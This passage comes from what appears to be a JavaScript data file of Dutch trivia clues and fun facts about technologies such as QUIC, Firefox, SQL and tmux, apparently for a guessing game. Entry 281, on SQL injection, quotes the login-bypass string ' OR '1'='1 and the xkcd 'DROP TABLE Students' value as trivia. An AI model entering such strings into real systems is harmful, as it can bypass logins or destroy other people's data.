    funFact: "Een camera filmt de muur met zo'n 100 lavalampen, en de onvoorspelbare beelden worden gemengd in de bron van willekeur voor versleuteling."
  },
  229: {
    clues: [
      'Jim Roskind ontwierp het rond 2012 bij Google.',
      'Het draait op UDP in plaats van TCP.',
      'Versleuteling met TLS 1.3 zit erin ingebouwd, niet erbovenop.',
      'Een verbinding blijft bestaan als je telefoon van wifi naar mobiele data wisselt.',
      'HTTP/3 draait erop, en de IETF legde het in 2021 vast in RFC 9000.',
      "Het transportprotocol met een naam die klinkt als 'quick'."
    ],
    funFact: 'De naam begon als afkorting van Quick UDP Internet Connections, maar in de IETF-versie is het officieel gewoon een naam.'
  },
  230: {
    clues: [
      'Een whitepaper van Satoshi Nakamoto werd gepubliceerd op 31 oktober 2008.',
      'Het eerste blok bevat een krantenkop over een bankenreddingsoperatie.',
      'De voorraad is begrensd op 21 miljoen.',
      "In 2010 betaalde iemand er 10.000 van voor twee pizza's.",
      'Miners strijden met proof of work om nieuwe blokken toe te voegen.',
      'De eerste cryptomunt.'
    ],
    funFact: "22 mei wordt gevierd als Pizza Day, omdat Laszlo Hanyecz in 2010 twee pizza's kocht voor 10.000 van de munten."
  },
  231: {
    clues: [
      'Kyle Mathews begon eraan in 2015.',
      'Het haalt content van overal naar één GraphQL-datalaag.',
      "Het bouwt React-sites tot statische pagina's, met een groot ecosysteem aan plug-ins.",
      'Netlify kocht het bedrijf erachter in 2023.',
      'Een paar jaar lang was het dé statische sitegenerator voor React.',
      "Het React-framework genoemd naar de 'Great' miljonair van F. Scott Fitzgerald."
    ],
    funFact: 'De naam komt van de roman The Great Gatsby.'
  },
  232: {
    clues: [
      "David P. Reed legde het in 1980 vast, in een RFC van ongeveer drie pagina's.",
      'De header is maar acht bytes.',
      'Het verstuurt datagrammen zonder handshake, zonder volgorde en zonder afleveringsgarantie.',
      'DNS, online games en videobellen gebruiken het vanwege de snelheid.',
      'QUIC, en daarmee HTTP/3, is erop gebouwd.',
      'Het User Datagram Protocol.'
    ],
    funFact: "Een klassieke grap: 'Ik zou je er een mop over vertellen, maar misschien komt hij niet aan.'"
  },
  233: {
    clues: [
      'Blake Ross en Dave Hyatt begonnen het als slanke afsplitsing van de Mozilla-suite.',
      'Het heette eerst Phoenix, daarna Firebird, voordat problemen met merknamen een derde naam afdwongen.',
      'Versie 1.0 kwam in november 2004 en ging de strijd aan met Internet Explorer.',
      'De Quantum-update in 2017 bracht onderdelen die in Rust geschreven waren.',
      'De engine is Gecko, en Mozilla maakt het.',
      'De browser genoemd naar een bijnaam van de rode panda.'
    ],
    funFact: 'Firefox is een andere naam voor de rode panda, ook al wordt het logo meestal als een vos gezien.'
  },
  234: {
    clues: [
      'Het W3C publiceerde de eerste versie in 2001.',
      'Het is een formaat gebaseerd op XML.',
      'Het path-element gebruikt een mini-taal met letters als M, L, C en Z.',
      'Het viewBox-attribuut bepaalt het coördinatensysteem.',
      "Iconen en logo's in dit formaat blijven scherp op elk formaat.",
      'Het Scalable Vector Graphics-formaat.'
    ],
    funFact: 'Omdat het gewone tekst is, kun je het met CSS opmaken en animeren en zelfs met de hand bewerken.'
  },
  235: {
    clues: [
      'Jeremy Ashkenas bracht het in 2010 uit.',
      'Het werd gehaald uit DocumentCloud, een tool voor journalisten.',
      'Het gaf structuur met models, collections, views en een router.',
      'Vroege versies van Trello en Airbnb gebruikten het.',
      'Het is afhankelijk van Underscore.js, van dezelfde auteur.',
      'De minimale MVC-library met een Engelse naam voor ruggengraat.'
    ],
    funFact: 'De geannoteerde broncode, van boven naar beneden te lezen, leerde een generatie ontwikkelaars hoe een framework werkt.'
  },
  236: {
    clues: [
      'Het werd voor het eerst gepubliceerd in 1963.',
      'Het gebruikt 7 bits, voor 128 tekens.',
      'De hoofdletter A is nummer 65, en een spatie is 32.',
      'De eerste 32 codes zijn onzichtbare stuurtekens, zoals line feed en bell.',
      'Tekeningen die met de tekens gemaakt worden, heten art.',
      'De American Standard Code for Information Interchange.'
    ],
    funFact: 'DEL is code 127, met alle zeven bits aan, omdat je op ponsband een teken kon wissen door alle gaatjes eruit te ponsen.'
  },
  237: {
    clues: [
      'Torkel Ödegaard begon eraan in 2014.',
      'Het begon als fork van het dashboard van Kibana.',
      'Het slaat zelf geen data op, maar vraagt databronnen zoals Prometheus uit.',
      'De stack van het bedrijf, Loki, Tempo en Mimir, vormt er samen een bekend code-reviewacroniem mee.',
      'Operationsteams zetten de dashboards op grote schermen.',
      'De opensourcetool voor dashboards en observability met een oranje logo.'
    ],
    funFact: "Het bedrijf noemt zijn stack van Loki, Grafana, Tempo en Mimir graag de LGTM-stack: 'looks good to me'."
  },
  238: {
    clues: [
      'Het verscheen in 2012.',
      'Het bouwt op ideeën uit een bekend paper uit 2007 over een zeer beschikbare key-value store.',
      'Elk item wordt gevonden via een partition key en een optionele sort key.',
      'Het belooft een latency van enkele milliseconden, op elke schaal.',
      'Het vangt de enorme verkeerspieken van Prime Day van Amazon op.',
      'De volledig beheerde NoSQL-database van AWS.'
    ],
    funFact: 'Het paper uit 2007 waarop het bouwt, inspireerde ook Cassandra en Riak.'
  },
  239: {
    clues: [
      'Carson Gross bracht het in 2020 uit als opvolger van intercooler.js.',
      'Het stelt dat hypermedia, niet JSON, je applicatie moet aansturen.',
      'Attributen als hx-get, hx-post en hx-swap doen het werk.',
      'De server stuurt stukjes HTML terug die delen van de pagina vervangen.',
      'De memes en het brutale socialmedia-account horen bij de populariteit.',
      'De kleine library die HTML zijn eigen AJAX geeft, met een naam van vier kleine letters.'
    ],
    funFact: 'De auteur schreef ook een gratis boek over de aanpak, Hypermedia Systems.'
  },
  240: {
    clues: [
      'Het begon in 2017 als experiment van Steve Sanderson.',
      'Het draait C# in de browser met WebAssembly.',
      'Componenten staan in .razor-bestanden die markup en C# mengen.',
      'Eén hostingmodel houdt de state op de server en werkt de pagina bij via SignalR.',
      'Het is het antwoord van Microsoft op single-page apps zonder JavaScript.',
      'Het .NET-framework voor web-UI met een naam die Browser en Razor samenvoegt.'
    ],
    funFact: "De naam is een mengsel van Browser en Razor, de templatesyntax van .NET, en klinkt als 'blazer'."
  },
  241: {
    clues: [
      'Matt Zabriskie bracht het in 2014 uit.',
      'Het is een HTTP-client op basis van promises die zowel in de browser als in Node.js werkt.',
      'Met interceptors verander je elk request of antwoord op één plek.',
      'Het zet JSON-antwoorden automatisch om naar objecten.',
      'Jarenlang was het de standaardkeuze, voordat fetch in Node.js kwam.',
      "De populaire JavaScript-HTTP-client met een naam die Grieks is voor 'waardig'."
    ],
    funFact: 'Node.js kreeg pas in versie 18, in 2022, een ingebouwde fetch; dat is een reden dat het zo lang populair bleef.'
  },
  242: {
    clues: [
      'Max Howell maakte het in 2009.',
      'Het vocabulaire draait om bier: formulae, casks, taps, bottles en de cellar.',
      'Op Macs met Apple Silicon installeert het in /opt.',
      'Met casks installeert het naast commandlinetools ook grafische apps.',
      "Het noemt zichzelf 'the missing package manager for macOS'.",
      'De pakketbeheerder voor de Mac met een naam die zelfgebrouwen bier betekent.'
    ],
    funFact:
      'In 2015 tweette de maker dat Google hem had afgewezen omdat hij geen binaire boom kon omkeren op een whiteboard, terwijl 90% van hun engineers zijn software gebruikte.'
  },
  243: {
    clues: [
      'Travis Oliphant maakte het rond 2005 door twee oudere libraries, Numeric en Numarray, samen te voegen.',
      'Het kerntype is de n-dimensionale array, ndarray.',
      'Met broadcasting combineer je arrays van verschillende vormen zonder lussen te schrijven.',
      'pandas, SciPy en scikit-learn zijn er allemaal op gebouwd.',
      'Mensen importeren het meestal als np.',
      'Het fundamentele pakket voor numeriek rekenwerk in Python.'
    ],
    funFact: 'Het werd gebruikt bij de analyse achter de eerste foto van een zwart gat in 2019 en de ontdekking van zwaartekrachtgolven.'
  },
  244: {
    clues: [
      'Het groeide uit de Web Inspector van het WebKit-project.',
      'Het opent met F12, of Cmd+Option+I op een Mac.',
      'De panelen zijn onder andere Elements, Console, Network, Sources en Performance.',
      'Het protocol is wat Puppeteer en veel andere tools gebruiken om de browser te besturen.',
      'Lighthouse-audits draai je vanaf een van de tabbladen.',
      'De ingebouwde ontwikkelaarstools van de browser van Google.'
    ],
    funFact:
      'Het protocol werd zo veel gebruikt dat Firefox een paar jaar een deel ervan implementeerde, zodat automatiseringstools ook Firefox konden besturen.'
  },
  245: {
    clues: [
      'Hampton Catlin ontwierp het in 2006, en Natalie Weizenbaum schreef er veel van.',
      'De oorspronkelijke syntax gebruikte inspringing in plaats van accolades.',
      'De nieuwere syntax, met accolades, is een superset van CSS.',
      'Variabelen beginnen met $, en er zijn mixins, nesting en @use.',
      'De belangrijkste implementatie is nu in Dart geschreven.',
      'De CSS-preprocessor met een naam die staat voor Syntactically Awesome Style Sheets.'
    ],
    funFact: 'De oorspronkelijke Ruby-implementatie werd in 2019 stopgezet, en sindsdien is de Dart-versie de referentie.'
  },
  246: {
    clues: [
      'Drie ontwikkelaars richtten het in 2007 op, eerst om Ruby-apps te hosten.',
      'Deployen was zo simpel als een git push naar de remote.',
      'Je app draait in lichte containers die dynos heten.',
      'Een Procfile vertelt welke processen gestart moeten worden.',
      'Salesforce kocht het in 2010, en het gratis abonnement stopte in 2022.',
      'Het baanbrekende platform-as-a-service met een paars logo.'
    ],
    funFact: "De naam is een samenvoeging van 'heroic' en 'haiku'."
  },
  247: {
    clues: [
      'Jared Palmer maakte het, en Vercel kocht het in december 2021.',
      'Het cachet de uitvoer van taken, zodat niets twee keer gebouwd wordt.',
      'De cache kan gedeeld worden met teamgenoten en CI.',
      'Taken en hun afhankelijkheden staan in een turbo.json-bestand.',
      'Het werd van Go naar Rust overgezet.',
      "Het buildsysteem voor monorepo's met een turbo in de naam."
    ],
    funFact: 'Door de remote cache kan een CI-run een build helemaal overslaan als een teamgenoot precies dezelfde code al had gebouwd.'
  },
  248: {
    clues: [
      'Guy Steele en Gerald Sussman maakten het in 1975 aan MIT.',
      'Het zou Schemer heten, maar het besturingssysteem stond maar bestandsnamen van zes tekens toe.',
      'De standaard vereist echte tail calls, zodat recursie lussen kan vervangen.',
      "Het gaf de wereld call/cc, een manier om 'de rest van het programma' als waarde te pakken.",
      'Het klassieke leerboek SICP leert programmeren met deze taal.',
      'Het minimalistische Lisp-dialect met een Engelse naam die ook plan of complot betekent.'
    ],
    funFact: 'Het volgt op twee eerdere AI-talen die Planner en Conniver heetten, daarom wilden de makers een naam in dezelfde geest.'
  },
  249: {
    clues: [
      'Chris Lattner en Vikram Adve begonnen eraan aan de University of Illinois rond 2000.',
      'Het hart is een tussenrepresentatie waar veel optimalisaties op werken.',
      'De frontend voor C en C++ heet Clang.',
      'Swift, Rust en Julia gebruiken het allemaal om machinecode te maken.',
      'De naam stond ooit voor Low Level Virtual Machine, maar is geen afkorting meer.',
      'De modulaire compilerinfrastructuur met een draak als logo.'
    ],
    funFact: 'Chris Lattner maakte daarna Swift bij Apple, en later de taal Mojo.'
  },
  250: {
    clues: [
      'Jarkko Oikarinen maakte het in 1988 aan de Universiteit van Oulu, Finland.',
      'Mensen deelden er nieuws mee tijdens de Sovjet-coup van 1991.',
      "Kanaalnamen beginnen met #, en commando's met een slash, zoals /join.",
      'Kanaaloperators, of ops, kunnen gebruikers eruit schoppen en verbannen.',
      'Veel opensourceprojecten zaten er decennialang op, op netwerken als Libera.Chat.',
      'Internet Relay Chat.'
    ],
    funFact: 'Tijdens de couppoging in Moskou in 1991 stuurden gebruikers er live verslagen doorheen, terwijl traditionele media gecensureerd werden.'
  },
  251: {
    clues: [
      'Matt Mullenweg en Mike Little brachten het in 2003 uit.',
      'Het begon als fork van een blogtool die b2/cafelog heette.',
      'De grote releases zijn genoemd naar jazzmuzikanten.',
      'De blokeditor had de codenaam Gutenberg.',
      'Het draait onder meer dan 40 procent van alle websites.',
      'Het PHP-contentmanagementsysteem dat als blogplatform begon.'
    ],
    funFact: 'De releases zijn genoemd naar jazzmuzikanten, zoals Miles Davis, Duke Ellington en Billie Holiday.'
  },
  252: {
    clues: [
      'Stuart Haber en W. Scott Stornetta beschreven in 1991 aan elkaar geketende documenten met tijdstempel.',
      "Het paper van Satoshi Nakamoto uit 2008 sprak van een 'chain of blocks'.",
      'Elk blok bevat de hash van het vorige.',
      'Een oud record veranderen zou betekenen dat al het werk daarna opnieuw moet.',
      'Bitcoin en Ethereum zijn erop gebouwd.',
      'Het grootboek van gekoppelde blokken waar alleen iets bij kan.'
    ],
    funFact: 'Sinds 1995 publiceert het bedrijf van Haber en Stornetta elke week een hash in de kleine advertenties van The New York Times.'
  },
  253: {
    clues: [
      'Het AI-onderzoekslab van Facebook bracht het in 2016 uit.',
      'Het is een Python-opvolger van een framework dat in Lua geschreven was.',
      'Het bouwt de rekengraaf terwijl de code draait, waardoor debuggen natuurlijk voelt.',
      'De autograd-engine berekent automatisch gradiënten van tensors.',
      'De meeste moderne AI-papers gebruiken het.',
      'De deep-learninglibrary met een vlam als logo, waarvan de naam met Py begint.'
    ],
    funFact: 'Sinds 2022 heeft het een eigen foundation onder de Linux Foundation.'
  },
  254: {
    clues: [
      'Het werd in 1996 uitgebracht door een Frans onderzoeksinstituut, INRIA.',
      'Het voegde objecten toe aan een oudere taal uit de ML-familie.',
      'Door type-inferentie hoef je bijna nooit een type op te schrijven.',
      'Het handelshuis Jane Street is de bekendste industriële gebruiker.',
      'De eerste compiler van Rust was erin geschreven.',
      'De Franse functionele taal met een kameel als logo.'
    ],
    funFact: 'Voordat Rust zichzelf kon compileren, was de compiler in deze taal geschreven.'
  },
  255: {
    clues: [
      'Facebook bouwde het in 2008 voor het doorzoeken van de inbox.',
      'Een van de makers was medeauteur van het Dynamo-paper van Amazon.',
      'Elke node in de ring is gelijk; er is geen leider.',
      'Je kiest het consistentieniveau per query, en je bevraagt het met CQL.',
      'Apple en Netflix draaien enkele van de grootste clusters.',
      'De wide-columndatabase genoemd naar een Trojaanse zieneres die niemand geloofde.'
    ],
    funFact: 'De naam, naar een zieneres wier juiste voorspellingen nooit geloofd werden, wordt vaak gezien als een grap richting Oracle.'
  },
  256: {
    clues: [
      'Het begon met een paper uit 2002 van Jeffrey Snover, het Monad Manifesto.',
      'De codenaam was Monad, en versie 1.0 verscheen in 2006.',
      'De pipeline geeft objecten door in plaats van platte tekst.',
      "Commando's volgen een Werkwoord-Zelfstandignaamwoord-patroon, zoals Get-ChildItem.",
      'Het is sinds 2016 open source en cross-platform.',
      'De shell en scripttaal van Microsoft, de opvolger van cmd.exe.'
    ],
    funFact: 'Scripts eindigen op .ps1, een overblijfsel uit de tijd dat men verwachtte dat een versie 2 een eigen extensie nodig zou hebben.'
  },
  257: {
    clues: [
      'Het werd in 2015 voor het eerst getoond onder de codenaam Sky.',
      'Het tekent elke pixel zelf in plaats van de standaardbesturingselementen van het platform te gebruiken.',
      'Alles is er een widget.',
      'Met hot reload zie je codewijzigingen binnen een seconde in een draaiende app.',
      'De apps worden in Dart geschreven.',
      'De cross-platform UI-toolkit van Google, genoemd naar het snelle fladderen van vleugels.'
    ],
    funFact: 'De eerste openbare demo, als Sky, mikte op een constante 120 beelden per seconde op Android.'
  },
  258: {
    clues: [
      'Brad Cox en Tom Love maakten het begin jaren 80.',
      'Het voegde berichten in Smalltalk-stijl toe aan een bestaande systeemtaal.',
      'Een methode aanroepen ziet eruit als [object message], met vierkante haken.',
      'NeXT nam in 1988 een licentie, en de klassenamen beginnen nog steeds met NS.',
      'Het was de hoofdtaal voor Mac- en iPhone-apps tot Swift kwam.',
      'De oudere app-taal van Apple: C met objecten erbovenop.'
    ],
    funFact:
      'Het voorvoegsel NS in klassen zoals NSString is een overblijfsel van NeXTSTEP, het besturingssysteem dat NeXT, het bedrijf van Steve Jobs, ermee bouwde.'
  },
  259: {
    clues: [
      'Het begon aan UC Berkeley in 2010.',
      "Het is een open instructieset die iedereen zonder royalty's mag gebruiken.",
      'Het heeft een kleine basis plus optionele extensies, zoals M voor vermenigvuldigen.',
      'De beherende organisatie verhuisde in 2020 naar Zwitserland.',
      "De naam spreek je uit als 'risk five'.",
      'De open instructieset-architectuur met een Romeins cijfer in de naam.'
    ],
    funFact: 'Het was het vijfde RISC-ontwerp van Berkeley; daar komt het Romeinse cijfer vandaan.'
  },
  260: {
    clues: [
      'Fabrice Bellard begon eraan in 2000.',
      'De library libavcodec decodeert bijna elk audio- en videoformaat dat ooit gemaakt is.',
      'VLC, Chrome en YouTube gebruiken allemaal de code.',
      'Een typisch commando begint met -i input.mp4.',
      "De naam combineert 'fast forward' met een videostandaard.",
      'Het Zwitserse zakmes om audio en video om te zetten vanaf de commandline.'
    ],
    funFact:
      'De maker, Fabrice Bellard, schreef ook de emulator QEMU en vestigde ooit een wereldrecord in het berekenen van decimalen van pi op een desktop-pc.'
  },
  261: {
    clues: [
      'Matei Zaharia begon eraan in het AMPLab van UC Berkeley in 2009.',
      'Het houdt data tussen stappen in het geheugen, anders dan klassiek MapReduce.',
      'De oorspronkelijke kernabstractie was de resilient distributed dataset, of RDD.',
      'De makers richtten in 2013 Databricks op.',
      'Het verwerkt enorme datasets over clusters, in Scala, Python, Java of SQL.',
      'De big-data-engine van Apache, met de Engelse naam voor een vonk.'
    ],
    funFact:
      'In 2014 vestigde het een wereldrecord door 100 terabyte drie keer sneller te sorteren dan het vorige Hadoop-record, met een tiende van de machines.'
  },
  262: {
    clues: [
      'CoreOS bracht het in 2013 uit.',
      "Het gebruikt het consensusalgoritme Raft om replica's het eens te laten zijn.",
      'Het is een sterk consistente, gedistribueerde key-value store.',
      'Kubernetes bewaart er al zijn clusterstate in.',
      "De naam combineert een configuratiemap van Unix met een 'd' voor distributed.",
      'De key-value store in het hart van elk Kubernetes-cluster, met een naam van vier kleine letters.'
    ],
    funFact: "De naam is de Unix-map /etc, waar configuratie staat, plus een 'd' voor distributed."
  },
  263: {
    clues: [
      'Donald Chamberlin en Raymond Boyce ontwierpen het in de jaren 70 bij IBM.',
      'De eerste naam moest veranderen, omdat een Brits vliegtuigbedrijf het merk bezat.',
      'Het is gebouwd op het relationele model van Edgar Codd.',
      'Je zegt wat je wilt, niet hoe je het krijgt: SELECT, FROM, WHERE.',
      'Elke relationele database spreekt er een dialect van.',
      "De Structured Query Language, door sommigen uitgesproken als 'sequel'."
    ],
    funFact: 'Het heette eerst SEQUEL, maar die naam was al een merk van vliegtuigbouwer Hawker Siddeley, dus gingen de klinkers eruit.'
  },
  264: {
    clues: [
      'Andy Stanford-Clark en Arlen Nipper ontwierpen het in 1999.',
      'Het was bedoeld om oliepijpleidingen te bewaken via dure satellietverbindingen.',
      'Clients publiceren en abonneren op topics via een centrale broker.',
      'Topics gebruiken slashes, en + en # zijn wildcards.',
      'Het is hét berichtenprotocol voor het Internet of Things.',
      'Het lichte publish/subscribe-protocol met een naam van vier letters die met MQ begint.'
    ],
    funFact: "De drie quality-of-serviceniveaus lopen van 'hooguit één keer' tot 'precies één keer'."
  },
  265: {
    clues: [
      'Een taalkundige maakte het in 1987 om rapportverwerking op Unix makkelijker te maken.',
      "Het motto is 'there's more than one way to do it'.",
      'Variabelen beginnen met een teken: $ voor scalars, @ voor arrays en % voor hashes.',
      'Het pakketarchief CPAN was een van de eerste in zijn soort.',
      'De taal van Larry Wall, beroemd om zijn reguliere expressies en zijn kamelenboek.',
      'De scripttaal waarvan de geplande zesde versie werd omgedoopt tot Raku.'
    ],
    funFact: "Larry Wall wilde het Pearl noemen, maar er bestond al een taal met die naam, dus liet hij de 'a' weg."
  },
  266: {
    clues: [
      'Lee McMahon schreef het bij Bell Labs in 1973 en 1974.',
      'Het bewerkt tekst terwijl die voorbijstroomt, regel voor regel.',
      'Het bekendste commando is s/old/new/g.',
      'De optie -i voor bewerken ter plekke werkt anders op macOS dan op Linux.',
      'Het wordt in shellscripts vaak gecombineerd met awk en grep.',
      'De stream-editor van Unix, met een naam van drie letters.'
    ],
    funFact: 'Omdat de BSD-versie een argument na -i verwacht en de GNU-versie niet, vermijden draagbare scripts bewerken ter plekke vaak helemaal.'
  },
  267: {
    clues: [
      'De broers Alexandre en Sébastien Chopin maakten het in 2016.',
      'Het werd geïnspireerd door een React-framework met een naam die er veel op lijkt.',
      'De server-engine heet Nitro.',
      'Routing op basis van bestanden, automatische imports en server-side rendering zijn ingebouwd.',
      'Het is het meta-framework voor Vue.',
      'Het antwoord van Vue op Next.js, met een naam van vier letters.'
    ],
    funFact: 'Het werd aangekondigd in oktober 2016, dezelfde maand als Next.js, het framework dat de inspiratie was.'
  },
  268: {
    clues: [
      'James Strachan begon er in 2003 aan als dynamische taal voor de JVM.',
      'Vrijwel elk Java-bestand is ook geldige code in deze taal.',
      'Jenkins-pipelines worden geschreven in een domeinspecifieke taal die erop gebouwd is.',
      'Gradle-buildbestanden werden jarenlang in deze taal geschreven, voordat Kotlin een optie werd.',
      'Het is nu een Apache-project.',
      'De JVM-taal met een naam die in de jaren 60 slang was voor cool.'
    ],
    funFact: 'De maker schreef later dat hij het waarschijnlijk nooit had gemaakt als hij in 2003 het boek Programming in Scala had gezien.'
  },
  269: {
    clues: [
      'Steve Wilhite maakte het bij CompuServe in 1987.',
      'Het is beperkt tot een palet van 256 kleuren.',
      'De versie van 1989 voegde animatie toe, en daarom leeft het nog steeds.',
      'Het patent op het compressiealgoritme leidde tot het ontstaan van PNG.',
      'De maker hield vol dat je het uitspreekt met een zachte g, zoals het Amerikaanse pindakaasmerk Jif.',
      'Het Graphics Interchange Format, beroemd om zijn animaties die blijven herhalen.'
    ],
    funFact:
      "Toen Steve Wilhite in 2013 een Webby voor zijn hele oeuvre kreeg, bestond zijn dankwoord van vijf woorden uit een dia die zei dat je het als 'jif' uitspreekt."
  },
  270: {
    clues: [
      'De eerste versie, in 1995, was gebaseerd op code van Spyglass Mosaic in licentie.',
      'Het bundelen met Windows leidde tot een beroemde antitrustzaak.',
      "Rond 2003 had het zo'n 95 procent van de browsermarkt.",
      'Webontwikkelaars schreven jarenlang hacks voor de zesde versie.',
      'Microsoft zette het in juni 2022 definitief stop.',
      "De oude browser van Microsoft met een blauwe 'e' als logo."
    ],
    funFact: 'XMLHttpRequest, de basis van moderne webapps, verscheen voor het eerst in deze browser, in versie 5.'
  },
  271: {
    clues: [
      "Het verving AppCache, dat in een bekend artikel een 'douchebag' werd genoemd.",
      'Het is een script dat los van de pagina draait, zelfs als de pagina gesloten is.',
      'Het onderschept elk netwerkrequest en kan antwoorden uit een cache.',
      'Het werkt alleen via HTTPS.',
      'Codeguessr gebruikt er een om offline speelbaar te blijven.',
      'Het browserscript dat werkt als programmeerbare netwerkproxy voor je webapp.'
    ],
    funFact: "Jake Archibald, die hielp het te ontwerpen, schreef het artikel 'Application Cache is a Douchebag' over de API die het verving."
  },
  272: {
    clues: [
      'John D. Hunter, een neurowetenschapper, maakte het in 2003.',
      'Hij wilde een commerciële tool vervangen om hersensignalen van epilepsiepatiënten te plotten.',
      'De pyplot-interface bootst bewust MATLAB na.',
      'plt.plot() gevolgd door plt.show() is hoe talloze grafieken beginnen.',
      'Seaborn en .plot() van pandas zijn erop gebouwd.',
      'De klassieke plotlibrary voor Python, met een naam die naar MATLAB knipoogt.'
    ],
    funFact: 'Een fellowship voor ontwikkelaars van wetenschappelijke Python-software is genoemd naar de maker, John Hunter, die in 2012 overleed.'
  },
  273: {
    clues: [
      'Jeremy Ashkenas bracht het in 2009 uit.',
      "Het motto was 'it's just JavaScript'.",
      'De dunne pijlen (->) en dikke pijlen (=>) bestonden al voordat JavaScript arrow functions had.',
      'Rails 3.1 maakte het de standaard voor nieuwe applicaties.',
      'Veel van wat het bood, zoals classes en destructuring, kwam in ES2015 terecht.',
      'De taal die naar JavaScript compileert, genoemd naar een warme drank.'
    ],
    funFact: 'De maker schreef ook Backbone.js en Underscore.js.'
  },
  274: {
    clues: [
      'Sophie Wilson en Steve Furber ontwierpen de eerste chip bij Acorn Computers in 1985.',
      'De naam betekende eerst Acorn RISC Machine.',
      'Het bedrijf maakt zelf geen chips; het verkoopt licenties op ontwerpen.',
      'Bijna elke smartphone draait erop.',
      'Apple zette de Mac er in 2020 op over met de M1.',
      'De zuinige processorarchitectuur uit Cambridge, met een Engelse naam van drie letters die ook een lichaamsdeel is.'
    ],
    funFact: 'De eerste chip gebruikte zo weinig stroom dat hij bleef draaien op lekstroom van andere chips, zelfs met zijn eigen voeding losgekoppeld.'
  },
  275: {
    clues: [
      'De maker bracht het in 1995 uit in Japan en zei dat het ontworpen was om programmeurs blij te maken.',
      'De naam volgt op die van een andere scripttaal, één geboortesteen-maand later.',
      'Zelfs getallen zijn er objecten, dus 5.times { ... } is een heel gewone lus.',
      'De libraries heten gems.',
      "Yukihiro 'Matz' Matsumoto heeft het gemaakt.",
      'De taal achter Rails, genoemd naar een rode edelsteen.'
    ],
    funFact: 'Matz koos de naam omdat het de geboortesteen van een collega was; de robijn hoort bij juli, direct na de parel van juni.'
  },
  276: {
    clues: [
      'Dmytro Zaporozhets begon eraan in Oekraïne in 2011.',
      'Een Nederlandse medeoprichter, Sid Sijbrandij, maakte er een bedrijf van.',
      'Het is beroemd omdat het volledig remote werkt en het handboek online publiceert.',
      'In 2017 verwijderde een engineer per ongeluk een productiedatabase, en het herstel werd live gestreamd.',
      'De pipelines worden geconfigureerd in een YAML-bestand in de root van de repository.',
      'Het DevOps-platform en de concurrent van GitHub, met een vosachtige tanuki als logo.'
    ],
    funFact: 'Tijdens de databasestoring in 2017 deelde het een openbaar Google-document en een YouTube-livestream terwijl het team de data herstelde.'
  },
  277: {
    clues: [
      'Kitware maakte het rond 2000 voor een toolkit voor medische beeldverwerking.',
      'Het bouwt zelf niets; het genereert bestanden voor andere buildtools.',
      'Het kan Makefiles, Ninja-bestanden of Visual Studio-solutions genereren.',
      'Moderne stijl draait om targets en target_link_libraries.',
      'De projectbestanden heten CMakeLists.txt.',
      'De cross-platform generator van buildsystemen voor C en C++.'
    ],
    funFact: 'De toolkit waarvoor het gebouwd werd, ITK, werd betaald door de Amerikaanse National Library of Medicine.'
  },
  278: {
    clues: [
      'Het ontstond in 2005 op een ontwerpinstituut in Ivrea, Italië.',
      'Het moest kunst- en ontwerpstudenten goedkoop elektronica laten bouwen.',
      "Programma's heten sketches.",
      'Elk programma heeft een functie setup() en een functie loop().',
      'De bordjes, zoals de Uno, zijn het klassieke startpunt voor hobby-elektronica.',
      'Het opensource-microcontrollerplatform genoemd naar een café in Ivrea.'
    ],
    funFact: 'De oprichters zaten vaak in een café genoemd naar Arduin, een koning van Italië rond het jaar 1000, en noemden het project daarnaar.'
  },
  279: {
    clues: [
      'Jon Skinner, een oud-Google-engineer uit Australië, bracht het in 2008 uit.',
      'Het maakte meerdere cursors en een minimap aan de zijkant populair.',
      "Met 'Goto Anything' open je bestanden in een paar toetsaanslagen.",
      'De proefperiode verloopt nooit, maar een venster vraagt regelmatig om een licentie te kopen.',
      'Voor VS Code was het de hippe editor voor webontwikkelaars.',
      'De snelle code-editor met een eerste woord dat subliem betekent.'
    ],
    funFact: 'Veel ontwikkelaars gebruikten het jarenlang zonder te betalen en klikten steeds hetzelfde venster weg dat om een licentie vroeg.'
  },
  280: {
    clues: [
      'Het werd voor het eerst uitgebracht in 1993 en groeide uit 386BSD.',
      'De wortels liggen bij de Berkeley Software Distribution van Unix.',
      'De mascotte is een rood duiveltje dat Beastie heet.',
      'Jails, ZFS en een enorme ports-collectie zijn sterke punten.',
      'Netflix streamt veel video vanaf servers die het draaien, en de PlayStation 4 is erop gebaseerd.',
      'Het bekendste vrije BSD-besturingssysteem.'
    ],
    funFact: 'Sony baseerde de besturingssystemen van de PlayStation 4 en 5 erop.'
  },
  281: {
    clues: [
      'Het werd voor het eerst publiekelijk beschreven in het hackersblad Phrack in 1998.',
      "Het klassieke voorbeeld typt ' OR '1'='1 in een loginformulier.",
      "Een xkcd-strip gaat over een jongen die Robert'); DROP TABLE Students;-- heet.",
      'Prepared statements met parameters voorkomen het.',
      'Het staat al decennia hoog in de OWASP Top 10.',
      "De aanval die databasecommando's meesmokkelt in gebruikersinvoer."
    ],
    funFact: "De jongen in xkcd-strip 327 staat bekend als 'Little Bobby Tables'."
  },
  282: {
    clues: [
      'John Warnock beschreef het idee in 1991 in een paper met de naam Camelot Project.',
      'Adobe bracht het in 1993 uit, gebaseerd op PostScript.',
      'Het werd in 2008 een open ISO-standaard.',
      'Het ziet er op elk scherm en elke printer hetzelfde uit.',
      'Acrobat Reader was de klassieke manier om het te openen.',
      'Het Portable Document Format.'
    ],
    funFact:
      'In het begin moest je software kopen om deze bestanden zelfs maar te bekijken; het gebruik groeide pas echt toen Adobe de Reader in 1994 gratis maakte.'
  },
  283: {
    clues: [
      'Nicholas Marriott begon eraan in 2007, en het werd onderdeel van OpenBSD.',
      'Het is een modern alternatief voor GNU Screen.',
      'Sessies blijven draaien als je de SSH-verbinding verbreekt.',
      'De standaard prefix-toets is Ctrl-b, gevolgd door toetsen zoals % om een paneel te splitsen.',
      'Sessies bevatten windows, en windows bevatten panes.',
      'De terminal multiplexer.'
    ],
    funFact: 'Veel ontwikkelaars laten maandenlang een sessie op een server draaien en koppelen er vanaf overal weer aan.'
  },
  284: {
    clues: [
      'Een commissie van Amerikaanse overheid en bedrijfsleven ontwierp het in 1959.',
      'Het moest bijna als Engels lezen, met werkwoorden als ADD, MOVE en PERFORM.',
      "Programma's zijn opgedeeld in divisions, zoals DATA en PROCEDURE.",
      'De eerdere taal FLOW-MATIC van Grace Hopper had er veel invloed op.',
      'Banken en overheden draaien het nog steeds op mainframes.',
      'De COmmon Business-Oriented Language.'
    ],
    funFact: 'In april 2020 vroeg de gouverneur van New Jersey publiekelijk om vrijwilligers die deze taal kenden, om uitkeringssystemen draaiende te houden.'
  },
  285: {
    clues: [
      'Isaac Z. Schlueter maakte het in 2010.',
